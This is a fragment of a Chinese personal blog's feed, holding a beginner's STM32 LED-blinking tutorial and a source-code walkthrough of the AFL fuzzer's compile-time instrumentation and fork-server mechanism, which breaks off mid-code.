href="https://e3pem.github.io/2019/07/03/IoT/%E6%8F%90%E5%8F%96tl-wdr5620%E5%9B%BA%E4%BB%B6/">https://e3pem.github.io/2019/07/03/IoT/提取tl-wdr5620固件/</a></p><p><a href="https://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html">https://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;问题多又多&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/categories/CVE/"/>
    
    
    <category term="cve" scheme="https://joe1sn.eu.org/tags/cve/"/>
    
    <category term="漏洞挖掘" scheme="https://joe1sn.eu.org/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>【STM32】1.点灯大师</title>
    <link href="https://joe1sn.eu.org/2023/09/10/stm32-1-light/"/>
    <id>https://joe1sn.eu.org/2023/09/10/stm32-1-light/</id>
    <published>2023-09-10T11:51:40.000Z</published>
    <updated>2023-09-10T13:11:53.162Z</updated>
    
    <content type="html"><![CDATA[<p>如何三小时之内，从0开始学会stm32点灯</p><p>（其实是想验证下发的芯片是不是好的）</p><span id="more"></span><h1 id="准备工作"><a class="markdownIt-Anchor" href="#准备工作"></a> 准备工作</h1><p>我是在JD上随便买的一家，有</p><p>STM32F103C8T6，面包板，USB转TTL，显示器…</p><p>缺啥少啥买配件就行了</p><h1 id="1软件"><a class="markdownIt-Anchor" href="#1软件"></a> 1.软件</h1><p>由于我们是小白，所以暂时不需要看电路啥的，直接先把软件装上。</p><ul><li>STM32CubeIDE</li></ul><p><strong>这里我参考了：BV1HM411b78E</strong></p><iframe src="//player.bilibili.com/player.html?aid=522761379&bvid=BV1HM411b78E&cid=964014224&p=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><p>或者知乎的<a href="https://zhuanlan.zhihu.com/p/321845090">https://zhuanlan.zhihu.com/p/321845090</a></p><p>知乎的有一个模拟程序</p><ul><li>驱动（因为我是USB转TTL）：CH340-驱动，这个你可以找客服要，一般都会发给你的</li><li>烧录软件：FLYMCU</li></ul><p>首先需要熟悉的就是STM32CubeIDE的使用，可以参考上面的B站视频后者知乎，这里还有：<a href="https://www.bilibili.com/video/BV13B4y1y7yk">https://www.bilibili.com/video/BV13B4y1y7yk</a></p><h1 id="2硬件"><a class="markdownIt-Anchor" href="#2硬件"></a> 2.硬件</h1><p>这个是始终绕不开的（除非你用EDA）</p><p><strong>1.面包板</strong></p><p>有时间可以参考：<a href="https://www.bilibili.com/video/BV1gz4y1Z7N7">https://www.bilibili.com/video/BV1gz4y1Z7N7</a></p><p>或者</p><p><img src="https://img.joe1sn.top/uploads/big/2e4be1b02468f7dc6f30ca5fa39743b3.png" alt="image-20230910201039379" /></p><p>导线就是这样连接的</p><p><strong>2.STM32F103C8T6</strong></p><p>显示再IDE中的</p><p><img src="https://img.joe1sn.top/uploads/big/240043662443e27813cb75699f9d0052.png" alt="image-20230910201448666" /></p><p>比如这里的<code>PA0</code>就是代表芯片的A0接口</p><p><img src="https://img.joe1sn.top/uploads/big/fa1182386227986f3a24676b4578f5b7.png" alt="image-20230910201538474" /></p><p>这里的<code>GPIO_Output</code>代表的是<code>信号输出</code>（严格来说不是这样的）。具体的设置可以参考<a href="https://www.bilibili.com/video/BV1ja411J766">https://www.bilibili.com/video/BV1ja411J766</a></p><p>在<code>main.c</code>中的<code>main</code>函数的<code>while</code>死循环里面有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Infinite loop */</span></span><br><span class="line"><span class="comment">/* USER CODE BEGIN WHILE */</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* USER CODE END WHILE */</span></span><br><span class="line"> HAL_GPIO_TogglePin(GPIOA, LED1_Pin);</span><br><span class="line"> HAL_Delay(<span class="number">200</span>);</span><br><span class="line"> HAL_GPIO_TogglePin(GPIOA, LED2_Pin);</span><br><span class="line"> HAL_Delay(<span class="number">200</span>);</span><br><span class="line">  <span class="comment">/* USER CODE BEGIN 3 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>LED1_Pin</code>和<code>LED2_Pin</code>是我给的命名，然后编译就好了</p><p><strong>3.烧录</strong></p><p>可以参考</p><p><a href="https://www.bilibili.com/video/BV1wR4y1y7E2/">https://www.bilibili.com/video/BV1wR4y1y7E2/</a></p><p><a href="https://www.bilibili.com/video/BV1P24y1L7Ho">https://www.bilibili.com/video/BV1P24y1L7Ho</a></p><p>PA9&lt;–&gt;RXD</p><p>PA10&lt;–&gt;TXD</p><p>设置条线：</p><p><img src="https://img.joe1sn.top/uploads/big/27a10a6eafd1d619725072f214b3a299.png" alt="image-20230910211049260" /></p><p>开始FLYMCU烧录</p><p><img src="https://img.joe1sn.top/uploads/big/90fd0e71f90e0c6eca76f4411c53e554.png" alt="image-20230910204832081" /></p><p>选hex文件烧进去就行了</p><p><strong>如果你像我上图那样外接电源</strong>，在烧录的时候也是需要将其插入USB接口中的</p><h1 id="3电路"><a class="markdownIt-Anchor" href="#3电路"></a> 3.电路</h1><p><strong>不知道二极管功率的最好加上1k欧的电阻</strong>，信号时从A0和A1输出，最后流向的是G跳线（参考上图）</p><p>调回boot条线，按下复位键：</p><p><img src="https://img.joe1sn.top/uploads/big/f06da32c2c7c09a43ba0ac9ac1e50929.png" alt="image-20230910210541362" /></p><p>成功点亮</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;如何三小时之内，从0开始学会stm32点灯&lt;/p&gt;
&lt;p&gt;（其实是想验证下发的芯片是不是好的）&lt;/p&gt;</summary>
    
    
    
    <category term="hardware" scheme="https://joe1sn.eu.org/categories/hardware/"/>
    
    
    <category term="stm32" scheme="https://joe1sn.eu.org/tags/stm32/"/>
    
  </entry>
  
  <entry>
    <title>【源码分析】AFL源代码分析</title>
    <link href="https://joe1sn.eu.org/2023/07/22/afl-source/"/>
    <id>https://joe1sn.eu.org/2023/07/22/afl-source/</id>
    <published>2023-07-22T00:41:03.000Z</published>
    <updated>2024-01-10T04:45:48.085Z</updated>
    
    <content type="html"><![CDATA[<p>其实还是挺简单的</p><span id="more"></span><p><img src="https://img.joe1sn.top/uploads/big/2ce8fd381c9b8cd5f9ebfc1e137790c7.png" alt="image-20230722090502823" /></p><p>在一次期末报告里面做了这个报告</p><p><strong>关于AFL的基本步骤</strong></p><p>工作流程基本上可以用 5 个步骤来描述：预处理、输入构建、输入选择、评估、后模糊测试。 真正的内核处理是步骤 2 到 4</p><ul><li><p>预处理</p><p>分析和获取有用信息，使用PIN，符号执行，污点检查</p><p>黑盒白盒</p></li><li><p>输入构建</p><p>从数据 S（种子）产生大量变异数据 I。</p></li><li><p>输入选择</p><p>过滤无效数据，优化模糊测试</p></li><li><p>评估</p><p>大多数关于模糊的研究集中在两个指标上：覆盖率和利用漏洞的平均时间</p></li></ul><h1 id="源码分析"><a class="markdownIt-Anchor" href="#源码分析"></a> 源码分析</h1><h2 id="编译插桩"><a class="markdownIt-Anchor" href="#编译插桩"></a> 编译插桩</h2><h3 id="afl-gcc"><a class="markdownIt-Anchor" href="#afl-gcc"></a> afl-gcc</h3><p>根据使用方法，首先是使用<code>afl-gcc</code>进行编译，在编译时就完成插桩</p><p><img src="https://img.joe1sn.top/uploads/big/97bdf6ef6f906c0fe4f25c248f13ece7.png" alt="image-20230722090843228" /></p><p>本就是是包裹的GCC盒CLANG</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isatty(<span class="number">2</span>) &amp;&amp; !getenv(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(cCYA <span class="string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\n&quot;</span></span><br><span class="line">         <span class="string">&quot;for gcc or clang, letting you recompile third-party code with the required\n&quot;</span></span><br><span class="line">         <span class="string">&quot;runtime instrumentation. A common use pattern would be one of the following:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;  CC=%s/afl-gcc ./configure\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  CXX=%s/afl-g++ ./configure\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\n\n&quot;</span>,</span><br><span class="line">         BIN_PATH, BIN_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  find_as(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  edit_params(argc, argv);</span><br><span class="line"></span><br><span class="line">  execvp(cc_params[<span class="number">0</span>], (<span class="type">char</span>**)cc_params);</span><br><span class="line"></span><br><span class="line">  FATAL(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>SAYF</code>就是<code>fprintf</code>函数，检测到参数小于2的时候报错并退出</p><ul><li>使用<code>find_as</code>进行参数的解析到自身程序路径，找到<code>afl-as</code>的afl汇编器</li><li><code>edit_params</code>中，解析参数，设置自生对应的编译器，获得和设置一系列环境变量，最后得到的<code>cc_params</code>就是编译参数</li><li><code> execvp(cc_params[0], (char**)cc_params);</code>，通过前面找到的汇编器<code>as_path</code>和参数创建进程进行插桩编译。（具体就是替换了程序名称之类的，源码很简单）</li></ul><h3 id="afl-as"><a class="markdownIt-Anchor" href="#afl-as"></a> afl-as</h3><p><strong>main</strong></p><p>进入main创建了一些列变量然后就是在<code>a</code> 中将 <code>cc_params</code> 转为<code>as_params</code></p><p><strong>add_instrumentation</strong></p><p>重头函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (fgets(line, MAX_LINE, inf)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In some cases, we want to defer writing the instrumentation trampoline</span></span><br><span class="line"><span class="comment">       until after all the labels, macros, comments, etc. If we&#x27;re in this</span></span><br><span class="line"><span class="comment">       mode, and if the line starts with a tab followed by a character, dump</span></span><br><span class="line"><span class="comment">       the trampoline now. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;</span><br><span class="line">        instrument_next &amp;&amp; line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">              R(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">      instrument_next = <span class="number">0</span>;</span><br><span class="line">      ins_lines++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以，AFL的代码插桩，就是在将源文件编译为汇编代码后，通过<code>afl-as</code>完成。开始重写汇编指令，准备在分支处插入代码</p><p>先看看32位，64位和这个也差不多</p><p><code>trampoline_fmt_32</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">static const u8* trampoline_fmt_32 =</span><br><span class="line"></span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;.align 4\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;leal -16(%%esp), %%esp\n&quot;</span><br><span class="line">  &quot;movl %%edi,  0(%%esp)\n&quot;</span><br><span class="line">  &quot;movl %%edx,  4(%%esp)\n&quot;</span><br><span class="line">  &quot;movl %%ecx,  8(%%esp)\n&quot;</span><br><span class="line">  &quot;movl %%eax, 12(%%esp)\n&quot;</span><br><span class="line">  &quot;movl $0x%08x, %%ecx\n&quot;</span><br><span class="line">  &quot;call __afl_maybe_log\n&quot;</span><br><span class="line">  &quot;movl 12(%%esp), %%eax\n&quot;</span><br><span class="line">  &quot;movl  8(%%esp), %%ecx\n&quot;</span><br><span class="line">  &quot;movl  4(%%esp), %%edx\n&quot;</span><br><span class="line">  &quot;movl  0(%%esp), %%edi\n&quot;</span><br><span class="line">  &quot;leal 16(%%esp), %%esp\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;/* --- END --- */\n&quot;</span><br><span class="line">  &quot;\n&quot;;</span><br></pre></td></tr></table></figure><p>这就是汇编，听chatGPT说</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    lea esp, [esp-16]      ; leal -16(%esp), %esp</span><br><span class="line">    mov [esp], edi         ; movl %edi, 0(%esp)</span><br><span class="line">    mov [esp+4], edx       ; movl %edx, 4(%esp)</span><br><span class="line">    mov [esp+8], ecx       ; movl %ecx, 8(%esp)</span><br><span class="line">    mov [esp+12], eax      ; movl %eax, 12(%esp)</span><br><span class="line">    mov ecx, 0x08000000    ; movl $0x%08x, %ecx</span><br><span class="line">    call __afl_maybe_log   ; call __afl_maybe_log</span><br><span class="line">    mov eax, [esp+12]      ; movl 12(%esp), %eax</span><br><span class="line">    mov ecx, [esp+8]       ; movl 8(%esp), %ecx</span><br><span class="line">    mov edx, [esp+4]       ; movl 4(%esp), %edx</span><br><span class="line">    mov edi, [esp]         ; movl 0(%esp), %edi</span><br><span class="line">    lea esp, [esp+16]      ; leal 16(%esp), %esp</span><br></pre></td></tr></table></figure><p>32位是经典的栈传参，这里使用对esp的移动实现了从<code>edi</code> <code>edx</code> <code>ecx</code> <code>eax</code>的保存，然后又将<code>ecx</code>设置为了0x08000000，这个是chatGPT翻译错了，正确的理解是&quot;%08x&quot; 是格式说明符，用于将一个整数格式化为一个带有前导零的 8 位十六进制数。例如，“%08x” 将把数字 10 格式化为 “0000000A”。这段汇编仍然是属于C语言的范畴。</p><p>似乎我们下一步要看的是<code>__afl_maybe_log</code>，**但是你就没想过R(MAP_SIZE)**有什么用吗？<code>R(x)</code>的定义是<code>(random() % (x))</code>，所以<code>R(MAP_SIZE)</code>即为0到MAP_SIZE之间的一个随机数。</p><p>因此，在处理到某个分支，需要插入桩代码时，<code>afl-as</code>会生成一个随机数，作为运行时保存在<code>ecx</code>中的值。而这个随机数，便是用于标识这个代码块的key。</p><p>接下来来到<code>__afl_maybe_log</code></p><h2 id="运行"><a class="markdownIt-Anchor" href="#运行"></a> 运行</h2><p>开始fuzz，那么afl如何启动这个程序，可以看看<code>afl-fuzz.c</code>，不过最开始后世设置参数，这里将重要点的部分。</p><p>调用的链条有点复杂首先在L8044</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skipped_fuzz = fuzz_one(use_argv);</span><br></pre></td></tr></table></figure><p>然后的<code>fuzz_one</code>中，使用队列<code>queue_cur</code>来管理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res = calibrate_case(argv, queue_cur, in_buf, queue_cycle - <span class="number">1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>在<code>calibrate_case</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dumb_mode != <span class="number">1</span> &amp;&amp; !no_forkserver &amp;&amp; !forksrv_pid)</span><br><span class="line">  init_forkserver(argv);</span><br></pre></td></tr></table></figure><p>总算是找到了</p><blockquote><p>为了更高效地进行上述过程，AFL实现了一套fork server机制。其基本思路是：启动target进程后，target会运行一个fork server；fuzzer并不负责fork子进程，而是与这个fork server通信，并由fork server来完成fork及继续执行目标的操作。这样设计的最大好处，就是不需要调用<code>execve()</code>，从而节省了载入目标文件和库、解析符号地址等重复性工作</p></blockquote><p>L1987</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> st_pipe[<span class="number">2</span>], ctl_pipe[<span class="number">2</span>];</span><br><span class="line">....</span><br><span class="line">forksrv_pid = fork();</span><br></pre></td></tr></table></figure><p>使用pipe和forkserver进行通讯</p><p>L2088的位置开始执行<code>execv(target_path, argv);</code>。其实看到这里我也很疑惑上面的解释</p><p>在L2103中测试和forkserver的通讯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    fsrv_ctl_fd = ctl_pipe[<span class="number">1</span>];</span><br><span class="line">    fsrv_st_fd  = st_pipe[<span class="number">0</span>];</span><br><span class="line">    rlen = read(fsrv_st_fd, &amp;status, <span class="number">4</span>);</span><br><span class="line">...</span><br><span class="line">  <span class="comment">/* If we have a four-byte &quot;hello&quot; message from the server, we&#x27;re all set.</span></span><br><span class="line"><span class="comment">     Otherwise, try to figure out what went wrong. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (rlen == <span class="number">4</span>) &#123;</span><br><span class="line">    OKF(<span class="string">&quot;All right - fork server is up.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;    </span><br></pre></td></tr></table></figure><p>接下来的fork server是如何与fuzzer通信是面试考点（/doge）</p><h3 id="forkserver"><a class="markdownIt-Anchor" href="#forkserver"></a> forkserver</h3><p>知道创宇不知道是讲的太碎了还是我理解有问题，在这里我就不怎么追的了代码了，不过想起开始说过的：<strong>fuzzer并不负责fork子进程，而是与这个fork server通信，并由fork server来完成fork及继续执行目标的操作</strong>，那么很有可能和插进去的<code>__afl_maybe_log</code>一样是插入入进去了一个<code>forkserver</code>在代码当中，那么回到<code>afl-as</code>，L446</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ins_lines)</span><br><span class="line">  <span class="built_in">fputs</span>(use_64bit ? main_payload_64 : main_payload_32, outf);</span><br></pre></td></tr></table></figure><p>依然以32位举例子<code>main_payload_32</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__afl_forkserver:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Enter the fork server mode to avoid the overhead of execve() calls. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl %ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl %edx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Phone home and tell the parent that we&#x27;re OK. (Note that signals with\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     no SA_RESTART will mess it up). If this fails, assume that the fd is\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     closed because we were execve()d from an instrumented binary, or because\n&quot;</span> </span><br><span class="line">  <span class="string">&quot;     the parent doesn&#x27;t want to use the fork server. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $4          /* length    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $__afl_temp /* data      */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $&quot;</span> STRINGIFY((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;  /* file desc */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  write\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $12, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  cmpl  $4, %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jne   __afl_fork_resume\n&quot;</span></span><br></pre></td></tr></table></figure><p>看注释也看的明白了，给fuzzer说已经准备完毕，其中<code>$__afl_temp</code>就是四字节长度的验证信息，然后开始等待循环，读取命令管道，直到fuzzer通知其开始</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__afl_fork_wait_loop:\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* Wait for parent by reading from the pipe. Abort if read fails. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  pushl $4          /* length    */\n&quot;</span></span><br><span class="line"><span class="string">&quot;  pushl $__afl_temp /* data      */\n&quot;</span></span><br><span class="line"><span class="string">&quot;  pushl $&quot;</span> STRINGIFY(FORKSRV_FD) <span class="string">&quot;        /* file desc */\n&quot;</span></span><br><span class="line"><span class="string">&quot;  call  read\n&quot;</span></span><br><span class="line"><span class="string">&quot;  addl  $12, %esp\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  cmpl  $4, %eax\n&quot;</span></span><br><span class="line"><span class="string">&quot;  jne   __afl_die\n&quot;</span>      </span><br></pre></td></tr></table></figure><p>有错误就寄<code>__afl_die</code>，那么成功的话</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;  /* Once woken up, create a clone of our process. This is an excellent use\n&quot;</span></span><br><span class="line"><span class="string">&quot;     case for syscall(__NR_clone, 0, CLONE_PARENT), but glibc boneheadedly\n&quot;</span></span><br><span class="line"><span class="string">&quot;     caches getpid() results and offers no way to update the value, breaking\n&quot;</span></span><br><span class="line"><span class="string">&quot;     abort(), raise(), and a bunch of other things :-( */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  call fork\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  cmpl $0, %eax\n&quot;</span></span><br><span class="line"><span class="string">&quot;  jl   __afl_die\n&quot;</span></span><br><span class="line"><span class="string">&quot;  je   __afl_fork_resume\n&quot;</span>        </span><br></pre></td></tr></table></figure><p>得到父子进程的ID，对待子进程走到<code>__afl_fork_resume</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__afl_fork_resume:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* In child process: close fds, resume execution. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $&quot;</span> STRINGIFY(FORKSRV_FD) <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  close\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushl $&quot;</span> STRINGIFY((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  call  close\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addl  $8, %esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  popl %edx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  popl %ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  popl %eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jmp  __afl_store\n&quot;</span></span><br></pre></td></tr></table></figure><p>对于大于0的返回值（即父进程）他继续运行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span 